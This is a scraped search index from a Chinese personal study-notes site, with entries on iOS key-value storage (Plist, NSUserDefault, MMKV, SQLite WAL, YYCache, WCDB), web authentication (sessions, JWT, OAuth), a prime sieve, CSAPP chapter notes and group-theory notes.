\u0026lt;key\u0026gt;quiz\u0026lt;/key\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;question\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;text\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;What does \u0026#39;API\u0026#39; stand for?\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;answer\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;API stands for Application Programming Interface.\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;text\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;What\u0026#39;s so good about pragmatic REST?\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;answer\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;It\u0026#39;s focused on the api consumer, so it makes it easier for developers to contribute to your app library!\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/dict\u0026gt;  读写性能都是 O(n)，必须全部从磁盘中读出写入； 数据完整性：每次都要全量读写。断电等不可抗力发生时，数据损失发生概率更大； 磁盘空间复杂度 O(n)，内存空间复杂度 0； 并发性能需要自己实现；  适用场景：\n Plist 不适合存储过多数据，这样会造成比较严重的读/写延时。同时也会增加 Plist 损坏的概率，导致数据丢失。 Plist 适合与简单少量配置存储的场景，这种情况下，性能可以接受，操作的实现也足够简洁。  NSUserDefault #  NSUserDefault 是常用的客户端 K-V 存储方案，其底层使用 Plist 文件存储，不同于直接操作 Plist 文件读写数据：\n NSUserDefault 内部设置了内存缓存，大大提升了读性能； 通过异步跨线程的延时同步机制，NSUserDefault 会在写入事件发生后的一段时间批量的处理写入操作，提升写入性能。  性能分析：\n 读操作一般是直接读取内存，平均时间复杂度为 0；最坏读性能发生初始化之前，时间复杂度 O(n)； 如果平均 x 次写入进行一次全量写回，平均时间复杂度 O(n/x)；最坏就是连续全量写回 O(n)； 数据完整性：NSUserDefault 的异步延时同步机制很有可能导致数据在极端情况下无法触发，但是相对于 Plist，其有更少的回写次数。所以其数据损坏的可能性比 Plist 小，但是数据丢失的概率比 Plist 大。 空间性能：除了内存开销，与 plist 一致； 并发性能：NSUserDefault 是线程安全的，但是不支持并发；  NSUserDefault 是 Plist 的优化：\n 有更好的读写性能、以及更友好简单的操作接口； 但是它需要额外的内存开销，而且写性能依然比较差，经常会触发全量回写，没有质的提升，依然只推荐存储较少的数据； 它规模可以比 Plist 大，4M 以内是比较推荐的值（超过4M，Console 会有 Warning）。 在性能提升的同时，也更容易导致数据丢失，不建议存储非常重要的配置数据  MMKV #  mmap 技术 #  在了解 MMKV 技术之前我们需要先了解一下 mmap 技术：\n技术痛点：\n 在传统读写文件时，我们通常需要在内存中自己设置 buffer；以及处理文件与内存的同步（seek、write、read）。这通常比较复杂，我们还需要适当的 fsync 调用。  解决方案：\n Unix 操作系统提供了一个叫做 mmap 的函数，其底层适用 swap 实现。它将文件映射到进程的一块虚拟地址空间上，操作文件简化为直接操作内存。  示例程序：下面是一个拷贝文件的示例程序：\nauto mmap_src = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd_src, 0); auto mmap_dst = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd_dst, 0); if (mmap_src == MAP_FAILED || mmap_dst == MAP_FAILED) { return ; } memcpy(mmap_dst, mmap_src, size); 因为这种方案使用了虚拟内存系统的 swap 机制，mmap 有以下特性：\n 并不占用进程内存：他是直接映射到操作系统对 IO 设备的缓存 PageCache 上。相对于正常IO操作，他直接就省去了PageCache 复制数据到进程中的 Buffer 这一步骤，省去了一大笔内存复制的开销。 数据共享：多个进程如果映射到同一文件，因为他们会映射到相同的物理内存上。一个典型的例子就是动态库加载，动态库就是通过 mmap 来实现共享的。 回写特性：手动 msync 触发；在 munmap、进程被杀死、内存紧张时自动触发；部分操作系统也会定期回写。只要数据写入了内存，即使写入进程被杀死，操作系统也会负责数据的回写。  注意这个技术的第三点，也就是说如果我们不关心回写磁盘的问题，操作系统也会自动完成。\nMMKV 技术 #  什么是 MMKV（开源地址：https://github.com/Tencent/MMKV）？\n  MMKV 是腾讯开源的一个 k-v 存储库，旨在替代 NSUserDefault；\n  Plist 的写入瓶颈在于文件中没有数据结构，不能直接进行查询和数据插入操作，导致每次必须全量写入序列化后的数据；\n  MMKV 技术使用 mmap 在内存中映射了一个简单的数据结构；这个数据结构大概是以下几个部分：\n   META_INFO KEY_SIZE KEY_VALUE DATA_SIZE DATA_VALUE     一些基本信息比如检测数据完整性的 CRC 键大小 键 值大小 值      MMKV 技术的工作流程：\n 读数据：MMKV 在初始化的时候会通过 mmap 读取所有的数据，然后在内存中生成一个 Dictionary。 写数据：当有一个新 pair 时，首先写入缓存，然后在 mmap 文件尾部追加一个 pair。 注意:warning:：MMKV 文件中对于一个 Key 可能有多个 Pair 存在。即使一直操作同一个Pair，也会导致MMKV文件的增大。当 MMKV 写入的数据将要超过相关文件的大小时，MMKV 会进行 mumap 操作，并扩大文件长度，重新进行 mmap 操作，同时用内存缓存中的数据全量写入，覆写原来的 MMKV 文件内容，在此时完成 key-value 一对多的数据去重，解决了 MMKV 文件占用过大的问题。  性能分析：\n 读性能：正常时直接读取内存，所以平均读性能时间复杂度为 0；初始化时需要全量读取到内存中，并且 MMKV 不覆盖的特性每个键有多个值对应。设每个键有 k 个存储记录，时间复杂度 k*O(n)； 写性能：通常的操作仍然在内存中进行，复杂度 0；最坏情况是触发了 swap，全量写回 O(n)； 空间性能：因为冗余记录的存在，空间复杂度 k*O(n)；内存空间复杂度 O(n)。 并发性能：线程安全，但是不支持并发；  MMKV 彻底解决了 NSUserDefault 写入性能慢的问题，写入性能几乎达到内存级别，但是偶尔还是会有全量回写的情况发生。另外 MMKV 在正常情况下大大降低了数据丢失的风险（app 被突然杀死），但是对于突然断电的情况，可能会有比较大的风险。\nSQLite #  为了实现不依赖缓存的高效读/写，我们需要更高级的数据结构，基于 B-Tree 的 SQLite，是移动端目前一个比较好的选择，除了提供高效读写性能外，SQL 的强大查询能力也为我们实现高效 ORM 系统提供了基础。\nDELETE 模式 #  SQLite 提供了标准的事务回滚机制。为了实现事务回滚，SQLite 提供了日志的概念，即在写入数据到 B-Tree前记录一份日志到临时文件，如果事务写入失败，则通过日志恢复老的数据。\nSQLite 的默认日志模式为 DELETE 模式，即在写入完成后删除日志文件。\n性能分析：\n  读性能（平均与最坏相同）：假设 B-Tree 单个节点最多有 x 个孩子，则查询复杂度为 $$O(log_{x} n)$$，通常情况下，访问的节点数目不会超过 4 个。\n  写性能（平均与最坏相同）：查询老数据 $$O(log_x n)$$，写入日志 O(1)，写入 B-Tree $$O(log_x n)$$。 所以总共的 IO 复杂度为 $$O(2 * log_x n)$$。\n  空间性能：SQLite 的空间性能较差，主要是因为：\n B-Tree 的数据结构需要维护许多额外的索引，会带来极大的空间开销； 删除语句执行之后，默认不会删除相关的信息，而是将节点标记为可重用。    并发性能：SQLite 默认提供多种线程模式，可以设置为由 SQLite 提供线程安全的保证，也可以设置为有用户自行保证。在保证每个线程使用一个连接的情况下，SQLite 也支持读并发，但不支持读写并发和写写并发。\nSQLite 因为是天生多进程支持，锁级别是文件锁，文件锁的最大问题是不能像普通锁一样有自动唤醒机制，在获取锁失败后 SQLite 会过一段时间尝试再次获取锁（类似于自旋），如果超出一定的次数就会抛出 SQLite-Busy 错误。\n  DELETE 模式下的 SQLite，在读性能上有比较好的表现，平均和最坏性能都非常稳定。但是写入性能远远慢于读性能，为了安全，频繁的fsync 调用也会大大拖慢写入性能。但是由于其是增量操作模式，每次操作的数据不会很大，在正常情况下，写入性能也足够使用，至少远远高于传统的文件写入方式。\nWAL 模式 #  WAL 是 SQLite 新引进的一种日志技术，其旨在提升 SQLite 的写入性能，以及并发性。\n工作流程：\n WAL 模式下 SQLite 直接将新写入的数据转化为一个日志，追加在 WAL 文件的尾部（由于是追加，这个过程是顺序写，写入性能几十倍于随机写） 追加完以后，写入操作完成。 当写入的数据量到达一定阈值（默认为 4M）的时候，通过一个叫做 checkpoint 的过程，将 WAL 中记录的日志全部统一写回 B-Tree，然后删除 WAL 文件。  关于 checkpoint 主要会面临的难题：\n 写入峰值（在写入操作触发了 checkpoint 操作时后这次写入会非常慢）、WAL 文件大小控制；  性能分析：\n  平均读性能：读数据时先会从 WAL 文件查找数据，文件中有一个叫做 shm 的索引文件提供加速，WAL 大小控制在 10M 以内，查找效率接近于 B-Tree；如果 WAL 文件找不到则会进入 B-Tree 中查找。所以我们可以认为 IO 复杂度为 $$O(log_x n)$$\n最坏读性能：如果 WAL 文件过大，则读性能退化为线性，m 个日志记录的 IO 复杂度为 $$O(m)$$\n  平均写性能：写入只需要追加日志到 WAL 文件的尾部就完成了写入。又因为 WAL 文件的结构并不像 B-Tree 那样复杂，可以不需要每次写入 WAL 都进行 fsync，写入开销为 O(1)\n最坏写性能：当 SQLite 需要进行 Checkpoint 时，首先需要从 WAL 中读取数据，其次插入B-Tree，假设WAL 文件有 m 个日志，则写入开销为 $$m * O( log_x n ) + O(m)$$\n  数据完整性：WAL 文件损坏较容易恢复，完整性优于 DELETE 模式；\n  空间性能：WAL 文件还是运行的临时文件，空间性能与 DELETE 模式相似；\n  并发性能：WAL 模式提供了读写并发的能力，当一个读者进入 WAL 文件时，会找到最后一个没有被写入的节点并进行 mark，如 log6，然后在这个 log 之前的数据中进行查找相关 key 比较老的副本，而数据写入依然可以并发的 Append 到 WAL 文件的尾部。由于 SQLite-Busy 的问题依然存在，如果无法处理Busy，依然可以认为SQLite在WAL模式下也没有并发能力。\n  YYCache #  YYCache 是一个基于 SQLite 的持久化缓存框架，其作为 YYWebImage 的配套图片缓存广为人知。\n它有以下特点：\n YYCache 的接口是 K-V 形式的，并提供了淘汰策略。 YYCache 的持久化层由 SQLite 与文件系统混合组成。 YYCache 的 SQLite 中有一张 manifest 表来存储数据和淘汰策略相关的信息。  YYCache 一些机制分析：\n 小文件优化：对于 20KB 以下的文件直接存入 SQLite，节省磁盘空间。因为使用 mmap 操作文件系统，每个单独文件的大小一定是页表大小的整数倍（4K 或 8K）； 淘汰机制：为了维护 LRU (Least Recently Used) 相关数据，YYCache 每次读写入一个数据还需要额外记录 last_access_time 和 modification_time 数据，同时在整体大小超过阈值的时候，Query 全表找到最老的数据并批量删除。这为整个系统带来了额外的开销。 checkpoint 策略：YYCache 使用 SQLite 的 WAL 模式，并采用了默认的Checkpoint 策略。 注意:warning:：YYCache 的原生实现在进行读取操作后并没有进行 reset（只在每次读操作开始前 reset），这可能导致读行为一直不结束，进而导致 Checkpoint 无法回收正在被读取的数据，极端情况下会导致 WAL 膨胀到 GB 级别，最终导致 WAL 的 Checkpoint 永远无法完成，数据库读写操作全部直接卡死。  性能分析：\n  平均读性能：通常情况下，读数据时，为了维护 LRU 信息，还需要进行一次 last_access_time 写操作，所以其 IO 性能为 $$O(log_x n) + O(1)$$。如果命中了缓存，则只有写 IO 操作，即 O(1)。\n最坏读性能：就是触发 checkpoint 时，WAL 文件有 m 个日志，则 IO 性能为 $$m * O( log_x n ) + O(m) + O(log_x n)$$\n  平均写性能，同 WAL 模式的 SQLite，O(1)\n  最坏写性能，如果触发了 LRU 阈值，会进行全表扫描以及 delete，再加上 checkpoint，IO 复杂度为 $$O(n) + m * O( log_x n ) + O(m)$$\n  数据完整性能，同 WAL 模式的 SQLite。\n  空间性能，由于有额外字段记录 LRU 信息，会大于存储数据的本身，另外 YYCache 有内存缓存，大小是常数 k，复杂度为 O(k)。\n  并发性能，YYCache 采用了互斥模式，线程安全，但不能并发。\n  YYCache 作为一个缓存框架本身是很优秀的，特别在存储图片时，还会根据文件大小选择最合适的方案进行存储，减小了磁盘占用和碎片文件，提升了写入效率。但是 LRU 本身的开销还是非常大，基于全盘扫描的淘汰以及默认的 checkpoint 策略可能会导致比较严重的卡顿，自身的 Bug 还可能导致用户无限 ANR，空间占用也比较大。虽然 YYCache 的接口是 K-V 的，但是我们建议，当需要有淘汰机制的时候才选择 YYCache，如果只是需要一个 K-V 库请选用其他方案或者自己实现。\nWCDB #  WCDB 是腾讯开源的一个 SQLite 封装，其提供了高速 ORM 系统，以及针对 SQLite 进行了不少优化。\n下面列举这个封装做的几件事情：\n 优化并发能力：在WCDB 为了解决 SQLite-Busy 的问题，直接修改源码去除了 SQLite 的文件锁，使用正常的唤醒机制替换。这使得 SQLite 的并发能力得到充分的释放。 checkpoint 策略：SQLite 默认策略执行的两个缺点是，写入峰值与 WAL 文件无限增长：  对于前者，WCDB 使用异步 checkpoint 的方式：定义 sqlite3_wal_hook 函数用于执行 checkpoint，WAL 文件大小超过阈值后，开启新的线程等待 2s 执行这个函数，从而不会阻塞写入； 对于后者，为了防止 WAL 文件无限增长，当文件大小超过阈值后，WCDB 会锁死 DB，阻塞新的读写操作，直到 checkpoint 完成。    性能分析：\n  平均与最坏写性能均为 $$O(log_x n)$$；\n  平均写性能为 O(1)，最坏写性能为执行 checkpoint 时，因为进行了异步优化，所以用户无感知；\n  数据完整性能：WCDB 会定期备份 master 表，并在损坏时自动恢复，数据完整性能优于 WAL 模式的 SQLite。\n  空间性能：除了数据库开销外，还有备份 master 表的开销，但是该开销是固定的，所以空间性能和 WAL 模式下的 SQLite 类似。\n  并发性能：线程安全，支持读读并发，读写并发，不支持写并发。\n  "},{"id":74,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%94%A8%E6%88%B7%E7%B3%BB%E7%BB%9F/","title":"用户系统","section":"杂项博客","content":" 参考：\n https://sherryhsu.medium.com/session-vs-token-based-authentication-11a6c5ac45e4 https://jwt.io/introduction https://stackoverflow.com/questions/43452896/authentication-jwt-usage-vs-session https://en.wikipedia.org/wiki/OAuth   用户系统 #  Session Base Authentication #  流程简介 #  最传统的用户系统，django 的默认实现，用户登陆时后服务端会为当前会话创建一个 session 并且将 sessionID 作为 cookie 设置到客户端上，用户每次需要访问敏感资源时需要带上 sessionID，服务端通过 session 判断用户是否登陆成功。简单流程如下：\nJWT (Json Web Token) #  格式 #  JWT 是一种被写入 RFC7519 的协议标准。一个 JWT 的格式由 Base64 加密的 “Header”、“Payload”、“Signature” 三个部分由 . 字符拼接而成：\n上图中可以看出三部分的作用：\n header 部分表示当前 JWT 的算法； playload 则存储了当前登陆用户的信息（在传统基于 session 的登陆系统下，这一信息一般是存储在服务端），Playload 分为 Registered claims/Public claims/Private claims 三个类型； signature 用服务端的私钥进行 HMAC 确保 playload 中的信息没有被修改过；  工作流 #  在认证成功后，服务器会返回给客户端一个 JWT。当客户端需要访问任何敏感资源时，需要设置 Authorization 的请求头：\nAuthorization: Bearer \u0026lt;token\u0026gt; 图例：\n值得注意的是，因为 Token 是在请求头的 Authorization 中带上的，所以并不会被浏览器的跨域策略（CORS, Cross-Origin Resource Sharing）影响。Token 不是 Cookie。\n优点与缺点 #  JWT(Json Web Token) 相对 SWT(Simple Web Token) 与 SMAL(Security Assertion Markup Language Tokens) 的好处：\n JWT 相对于 SMAL 有更小的体积，相对于解析 xml 解析 json 更加简单，更适合在 http 协议于 html 文件的场景下进行传输； JWT 相对于 SWT 更加安全。SWT 只能解析基于共享密钥的对称加密算法，而 JWT（SMAL 也支持）则支持 X.509 格式的公私钥签名；  相比传统使用 sessionID 的 cookie 进行身份校验的好处：\n Scalability（可扩展性）：传统的 sessionID 策略如果将用户信息持久化存储在数据库中，每次请求数据库都会执行一次数据库查询；如果存储在内存中则存在分布式系统的横向扩展问题。jwt 将信息存储在客户端，并且服务端做鉴权，就不存在这个问题； Multiple Devices：可以用于设计 SSO 单点登录系统，因为 JWT Token 被设置在 http 请求头中，可以规避浏览器跨域问题；  JWT 也有一些缺点，在 RFC 的标准协议中没有指定解决方案：\n 客户端存储信息的安全性、JWT 信息传输的安全性、JWT Token 难以被控制失效、客户端信息信任问题；  nodejs 生态 #  jsonwebtoken 可以用于在服务端创建一个 JWT，express-jwt 中间件可以用于对 jwt 进行鉴权。\nOAuth (Open Authorization) #  OAuth 是一种第三方授权协议，现在讨论的版本通常是 OAuth2.0，也是 RFC 的标准协议 RFC6749。\nOAuth 的大致工作流程在 RFC 的文档中有详细解释：\n +--------+ +---------------+ | |--(A)- Authorization Request -\u0026gt;| Resource | | | | Owner | | |\u0026lt;-(B)-- Authorization Grant ---| | | | +---------------+ | | | | +---------------+ | |--(C)-- Authorization Grant --\u0026gt;| Authorization | | Client | | Server | | |\u0026lt;-(D)----- Access Token -------| | | | +---------------+ | | | | +---------------+ | |--(E)----- Access Token ------\u0026gt;| Resource | | | | Server | | |\u0026lt;-(F)--- Protected Resource ---| | +--------+ +---------------+ 在标准文档更关于不同授权模式的介绍，不详细赘述。\n值得注意的是 OAuth 与 JWT 并不是并列的关系，OAuth 中的 Access Token 可以用 JWT 实现，它们应该是一个嵌套的关系。\nOIDC (OpenID Connection) #  OIDC 是一个基于 OAuth2.0 的身份认证协议，\n"},{"id":75,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%B4%A0%E6%95%B0%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95/","title":"素数相关算法","section":"杂项博客","content":"素数相关算法 #  素性检测 #  关于一些素性检测的底层算法，在学校时，信息安全数学基础课上讲过。\n素数数量计算 #  Sieve of Eratosthenes，筛法：\nalgorithm Sieve of Eratosthenes is input: an integer n \u0026gt; 1. output: all prime numbers from 2 through n. let A be an array of Boolean values, indexed by integers 2 to n, initially all set to true. for i = 2, 3, 4, ..., not exceeding √n do if A[i] is true for j = i2, i2+i, i2+2i, i2+3i, ..., not exceeding n do A[j] := false return all i such that A[i] is true. "},{"id":76,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/1.tour/","title":"1. Tour","section":"CSAPP","content":"Tour of Computer-Systems #  Compilation #  Compiler: Program are translated into different forms.\nA classic compiler work in following sequence:\n Preprocessing Phase: Source program (hello.c) $$\\Rightarrow$$ Pre-Processor (cpp) $\\Rightarrow$ Modified source program (hello.i). Compilation Phase: Compiler (cc1) $$\\Rightarrow$$ Assembly program (hello.s). Assembly Phase: Assembler (as) $$\\Rightarrow$$ Relocatable object programs (hello.o). Linking Phase: Linker (ld) $$\\Rightarrow$$ Executable object program (hello)  We need to understand compilation systems work:\n Optimizing program performance; Understanding link-time errors; Avoiding security holes;  Hardware Organization #  Buses (总线):\n Buses are typically designed to transfer fixed-sized chunks of bytes known as word; 一个 word 的长度是计算机系统的基本度量单位，大多数现代机器都是 4 bytes (32-bits machine) 或 8 bytes (64-bits machine);  I/O Devices (IO 设备):\n Each I/O device is connected to the I/O bus by either a controller or an adapter:  controllers: chip sets in the device itself or on the motherboard; adapter: a card that plugs into a slot on the motherboard;    Main Memory (主存):\n Main memory consists of a collection of dynamic random access memory (DRAM) chips  Processor, central processing unit (CPU):\n CPU 核心由一个 word 大小的寄存器 PC (program counter)，它指向主存中的某个机器指令。 到目前为止，大部分计算机都是单处理器机器（which is known as a uniprocessor system），相对于多处理器机器（multiprocessor system），现在都是用多核单处理器系统。  Storage Hierarchy #  L0: Register;\nL1: L1 cache, SRAM;\nL2: L2 cache, SRAM;\nL3: L3 cache, SRAM;\nL4: Main memory, DRAM;\nL5: Local secodary storage, local disks;\nL6: Remote secondary storage (distributed file systems, web servers);\nOperating System #  Parallelism #  并发 Concurrency 与并行 Prallelism：\n We use the term concurrency to refer to the general concept of a system with multiple simultaneous activities. The term parallelism to refer to the use of concurrency to make a system run faster.  三层并行，通过三种不同类型的并发技术实现：\n Thread-Level Concurrency：线程是操作系统调度的基本单位。线程间的切换大约需要 20000 左右的时钟周期； Instruction-Level Parallelism：有的处理器一个时钟周期可以处理同时处理多个指令（被称为 superscalar processors），同时理论上也可以通过流水线设计来实现指令级别的并行； Single-Instruction Multiple-Data (SIMD) Parallelism：有的处理器提供了执行一个指令，得到多个输入数据结果的功能，比如最新的 AMD 和 Intel 处理器都提供了同时处理四对浮点数运算的功能。  "},{"id":77,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/2.representandmanipulate/","title":"2. Represent and Manipulate","section":"CSAPP","content":"Respresenting and Manipulating Information #  "},{"id":78,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/1.week_one/","title":"1.Week One","section":"信息安全数学基础","content":"第一周 #  概念 #  集合的大小：集合的势。\n基数：\n可数集（countable set）： a countable set is a set with the same cardinality (number of elements) as some subset of the set of natural numbers. A countable set is either a finite set or a countably infinite set.\ngraph LR; A[集合]; B1[有限集]; B2[无限集]; C1[可数集]; C2[不可数集]; A--\u0026gt;B1; A--\u0026gt;B2; B2--\u0026gt;C1; B2--\u0026gt;C2; 同余。\n同余关系，等价关系。\n数论基础 #  整除的性质。\n序偶。序组。叉积。\n辗转相除——求最大公约数。\n定理：\n 如果 a,b 互素，存在整数 m,n 使得 $$a m + b n = 1$$  算术基本定理：\n 任何一个正整数 a 可以分解成 $$\\displaystyle p_1^{s_1} p_2^{s_2} \u0026hellip; p_n^{s_n}$$，其中 $$p_i, i=1,2\u0026hellip;n$$ 是素数。  梅森素数。菲尔马素数。\n完全数：\n  如果一个正整数 N 的所有正因子之和为 2N，则 N 称为完全数。\n  $$\\sigma(a)$$ 表示 a 的素因子之和。\n  "},{"id":79,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/10.%E5%AD%90%E7%BE%A4/","title":"10.子群","section":"信息安全数学基础","content":"子群 #  概念和性质 #  定义（子群）：\n $$(G, *)$$ 是一个群，子集 $$H \\sub G$$，如果 H 对于运算 * 也构成群，则称 H 是 G 的子群，记为 $$H \\le G$$。 又于 $${e}, G$$ 必是 G 的子群，我们称他们为平凡子群，否则为非平凡子群 如果群 $$H \\not= G$$，我们称 H 为真子群，记为 $$H \u0026lt; G$$  定义（正规子群）：\n 设两个群满足 $$K \\le G$$，如果对 $$\\forall k \\in K, g \\in G \\Rightarrow gkg^{-1} \\in K$$，则 K 称为 G 的正规子群，记为 $$K \\vartriangleleft G$$  定理：\n 任意交换群 G 的每个子群 K 都是正规子群  定理：\n 设 H 是 G 的子群，则以下条件等价：  $$H \\vartriangleleft G$$ $$\\forall g \\in G, gHg^{-1} = H$$ $$\\forall g \\in G, gH = Hg$$ $$\\forall g_1, g_2 \\in G, g_1Hg_2H = g_1g_2H$$    "},{"id":80,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/11.%E5%BE%AA%E7%8E%AF%E7%BE%A4/","title":"11.循环群","section":"信息安全数学基础","content":"循环群 #  概念和性质 #  定义（循环子群）：\n  G 是一个群，且 $$a \\in G$$，则令以下集合称为由元素 a 生成的 G 的循环子群：\n  $$ = {a^n | n \\in \\mathbb{Z}}$$\n  PS：定理：\u0026lt;a\u0026gt; 是一个群，且是 G 的子群\n  定义（循环群）：\n G 是一个群，如果存在 $$a \\in G$$ 使得 $$G = $$。则称 G 为循环群，而且称 a 为 G 的生成元。  定理：\n 如果 G=\u0026lt;a\u0026gt; 是一个循环群，且 $$|G| = n$$，则当且仅当 $$gcd(k, n) = 1$$ 时，$$a^k$$ 是 G 的生成元。 推论：n 阶循环群共有 $$\\phi(n)$$ 个生成元。  定理：\n 如果 G=\u0026lt;a\u0026gt; 是一个循环群，且 $$S \\le G$$，则 S 必定是循环群，且如果 k 是使得 $$a^k \\in S$$ 的最小正整数，则 $$a^k$$ 是 S 的生成元。  "},{"id":81,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/12.%E7%BD%AE%E6%8D%A2%E7%BE%A4/","title":"12.置换群","section":"信息安全数学基础","content":"置换群 #  定义与概念 #  定义（置换）：\n 给定非空集合 X，将任意一个双射 $$\\alpha: X \\rightarrow X$$ 称作集合 X 的一个置换。  定义（对称群）：\n  如果把函数的复合 $$\\circ$$ 看作一种置换间的二元运算，可以证明 X 的所有置换所组成的集合 $$S_X$$ 与这个二元运算 $$\\circ$$ 组成的代数系统构成一个群。我们将上述的群 $$(S_X, \\circ)$$ 称为集合 X 上的对称群 (Symmetric Group)。\n  当 $$X = {1, 2, \\cdots, n}$$ 时，称 $$S_X$$ 为 n 次对称群，记作 $$S_n$$。可以用如下的记号来表示 $$S_n$$ 中的置换 $$\\alpha$$：\n$$\\alpha = \\begin{pmatrix}1 \u0026amp; 2 \u0026amp; \\cdots \u0026amp; n \\ \\alpha(1) \u0026amp; \\alpha(2) \u0026amp; \\cdots \u0026amp; \\alpha(n) \\end{pmatrix}$$。\n  定义（轮换）：\n  设 $$\\alpha \\in S_n, A = {i_1, i_2, \\cdots, i_r} \\sub N = {1, 2, \\cdots, n}, B = N - A$$。如果置换 $$\\alpha $$ 满足：\n 对 A 中的元素有 $$\\alpha(i_1) = i_2, \\alpha(i_2) = i_3, \\cdots, \\alpha(i_r) = i_1$$ 对 B 中的元素有 $$\\alpha(i) = i$$    则称置换 $$\\alpha$$ 为一个 r-轮换，也把 2-轮换称为对换。\n  "},{"id":82,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/13.%E9%99%AA%E9%9B%86%E4%B8%8E%E5%95%86%E7%BE%A4/","title":"13.陪集与商群","section":"信息安全数学基础","content":"陪集与商群 #  陪集 #  定义（左陪集）：\n $$(G, \\cdot)$$ 为群，$$H \\le G, a\\in G$$，我们用符号aH 来表示如下 G 的子集：$$aH = {ah | h \\in H}$$。并且称这样的子集为子群 H 的左陪集。  定义（左陪集关系）：\n 设群 $$(H, \\cdot)$$ 为群 $$(G, \\cdot)$$ 的子群，我们确定 G 上的一个关系：$$a, b \\in G, a \\equiv b \\Leftrightarrow a^{-1} \\cdot b \\in H$$，这个关系称作 G 上关于 H 的左陪集关系。  定理：\n 设群 $$(H, \\cdot)$$ 为群 $$(G, \\cdot)$$ 的子群，则 G 上关于 H 的左陪集关系是一个等价关系。  定义（等价类）：\n 群 $$(G, \\cdot)$$ 的子群 $$(H, \\cdot)$$ 所确定的左陪集关系对 G 划分等价类，我们将下面的等价类叫做以 a 为代表元的等价类 $$[a] = {x | x \\in G \\and a \\equiv x}$$  定理：\n 设群 $$(H, \\cdot)$$ 为群 $$(G, \\cdot)$$ 的子群，则有 $$[a] = aH$$  定理：\n 设群 $$(H, \\cdot)$$ 为群 $$(G, \\cdot)$$ 的子群，$$a, b \\in G$$，则：  $$aH = bH \\Leftrightarrow b^{-1} \\cdot a \\in H$$，特别地，$$aH = H \\Leftrightarrow a \\in H$$ 如果 $$aH \\cap bH \\not= \\varnothing$$，那么 $$aH = bH$$ 对 $$\\forall a \\in G, |aH| = |H|$$    定理（拉格朗日定理）：\n 设 $$(H, \\cdot)$$ 为有限群 $$(G, \\cdot)$$ 的子群，则 $$|H|$$ 为 $$|G|$$ 的因子。  商群 #  定义（商集）：\n 设群 $$(G, \\cdot)$$ 有一个子群 $$(H, \\cdot)$$，则 H 在 G 中两两不相交左陪集组成的集合 $${aH | a \\in G}$$ 叫做 H 在 G 中的商集，记作 $$G / H$$； $$G / H$$ 中两两不相交的左陪集的个数叫做 H 在 G 中的指标，记为 $$[G:H]$$  定义（商群）：\n 设群 $$(G, \\cdot)$$ 有一个正规子群 $$(N, \\cdot)$$，$$T = G / N$$ 是 N 在 Ｇ 中的商集， 在商集 T 上定义二元运算 $$\\odot$$：$$\\forall a,b \\in G, aN, bN \\in T \\Rightarrow aN \\odot bN = (a \\cdot b)N$$，则 $$(T, \\odot)$$ 构成群，称这个群为商群。在不致混淆的情况下，我们将子群与商群中的运算都记作 $$\\cdot$$  "},{"id":83,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/14.%E5%90%8C%E6%80%81%E4%B8%8E%E5%90%8C%E6%9E%84/","title":"14.同态与同构","section":"信息安全数学基础","content":"同态和同构 #  同态与同构 #  定义（同态）：\n $$(X, \\cdot)$$ 与 $$(Y, *)$$ 是两个群，如果存在映射 $$x \\rightarrow y$$，使得 $$\\forall x_1, x_2 \\in X$$，都有 $$f(x_1 \\cdot x_2) = f(x_1) * f(x_2) $$， 则称 f 是从 $$(X, \\cdot)$$ 到 $$(Y, *)$$ 的同态映射或称群 $$(X, \\cdot)$$ 与群 $$(Y, *)$$ 同态，记作 $$(X, \\cdot) \\sim (Y, *)$$ 或 $$X \\sim Y$$ 一个群到自身的同态叫做自同态；  定义（同构）：\n 若同态映射 f 是单射，则称此同态为单同态； 若同态映射 f 是满射，则称此同态为满同态； 若同态映射 f 是双射，则称此同态为同构，记作 $$(X, \\cdot) \\cong (Y, *)$$，或者 $$X \\cong Y$$； 一个群到自身的同构叫做自同构  定义（核与像）：\n 若两个集合满足 $$(S, \\cdot) \\sim (G, \\odot)$$，e 和 e' 